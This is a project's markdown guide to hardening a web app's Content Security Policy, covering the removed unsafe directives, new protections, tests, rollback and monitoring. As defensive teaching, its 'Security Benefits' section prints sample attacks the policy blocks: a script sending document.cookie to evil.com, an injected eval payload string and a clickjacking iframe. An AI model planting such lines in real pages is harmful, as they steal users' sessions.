# Content Security Policy (CSP) Improvements

## Changes Made

### Removed Unsafe Directives from script-src

**Before:**
```
script-src 'self' 'unsafe-inline' 'unsafe-eval' cdn.jsdelivr.net
```

**After:**
```
script-src 'self' https://cdn.jsdelivr.net
```

**Impact:**
- ❌ Removed `'unsafe-inline'` - prevents inline `<script>` tags (XSS protection)
- ❌ Removed `'unsafe-eval'` - prevents `eval()`, `new Function()` (XSS protection)
- ✅ Kept `https://cdn.jsdelivr.net` - required for any CDN scripts

### Added Missing Security Directives

```
frame-ancestors 'none'  - Prevents clickjacking
base-uri 'self'         - Prevents base tag injection
form-action 'self'      - Restricts form submissions
```

## Testing Instructions

### 1. Build and Test Locally

```bash
npm run build
npm run preview
```

### 2. Check Browser Console

Open DevTools → Console

**Expected:** No CSP violation errors

**If you see CSP violations:**
- Note the violated directive
- Check if it's a legitimate resource
- If yes, add specific exception
- If no, investigate potential XSS attempt

### 3. Test Critical Functionality

- [ ] Login/logout works
- [ ] Image upload works
- [ ] Forms submit correctly
- [ ] Charts render properly
- [ ] Real-time updates work (Supabase)
- [ ] Third-party integrations work

### 4. Test in Production

After deploying to Vercel:

```bash
# Check CSP header is applied
curl -I https://your-domain.com | grep -i "content-security-policy"

# Should return:
# content-security-policy: default-src 'self'; script-src 'self' https://cdn.jsdelivr.net; ...
```

## Potential Issues and Solutions

### Issue: React inline event handlers break

**Symptom:** onClick, onChange don't work
**Solution:** This shouldn't happen with Vite builds, but if it does:
- React compiles JSX to function calls (not inline scripts)
- Vite bundles everything (no inline scripts)
- If issues persist, temporarily add `'unsafe-inline'` back and investigate

### Issue: Third-party scripts blocked

**Symptom:** Console shows: "Refused to load script from 'https://...'"
**Solution:** Add the domain to script-src:

```json
"script-src 'self' https://cdn.jsdelivr.net https://trusted-domain.com"
```

### Issue: WebSockets connection fails

**Symptom:** Real-time updates don't work
**Solution:** Already handled - `connect-src` includes `wss://*.supabase.co`

## Rollback Plan

If critical functionality breaks after deployment:

### Option 1: Quick Rollback (Emergency)

Edit `vercel.json` and temporarily add back `'unsafe-inline'`:

```json
"script-src 'self' 'unsafe-inline' https://cdn.jsdelivr.net"
```

### Option 2: Targeted Exception

If specific functionality needs inline scripts, use nonces:

```html
<!-- In HTML -->
<script nonce="RANDOM_NONCE_HERE">
  // Inline script here
</script>
```

```
// In CSP
script-src 'self' 'nonce-RANDOM_NONCE_HERE'
```

## Security Benefits

### Removed 'unsafe-eval'

**Prevents:**
- `eval("malicious code")`
- `new Function("malicious code")`
- `setTimeout("malicious code", 100)`
- `setInterval("malicious code", 100)`

**Attack Scenario Prevented:**
```javascript
// Attacker injects:
userInput = "'); eval(atob('...malicious payload...')); //";

// Without unsafe-eval CSP, eval() is blocked
eval(userInput); // ❌ Blocked by CSP
```

### Removed 'unsafe-inline' from script-src

**Prevents:**
```html
<!-- Attacker injected via XSS: -->
<script>
  fetch('https://evil.com/steal?cookie=' + document.cookie);
</script>
<!-- ❌ Blocked by CSP -->
```

### Added 'frame-ancestors none'

**Prevents:**
```html
<!-- Attacker's site: -->
<iframe src="https://reelyrated.com"></iframe>
<!-- ❌ Blocked - prevents clickjacking -->
```

## Monitoring

After deployment, monitor for:

1. **CSP Violation Reports** (if configured)
2. **Error logs** - check for CSP-related errors
3. **User reports** - functionality breaking
4. **Browser console** - violation warnings

## Next Steps

### Short-term (Week 1)
- ✅ Deploy stricter CSP
- ⏳ Monitor for violations
- ⏳ Verify all functionality works

### Long-term (Month 1)
- [ ] Implement CSP reporting endpoint
- [ ] Add nonces for any required inline scripts
- [ ] Remove `'unsafe-inline'` from style-src (use PostCSS)
- [ ] Add `upgrade-insecure-requests` directive
- [ ] Add `report-uri` or `report-to` directive

## References

- [MDN CSP Guide](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
- [CSP Evaluator](https://csp-evaluator.withgoogle.com/)
- [OWASP CSP Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html)
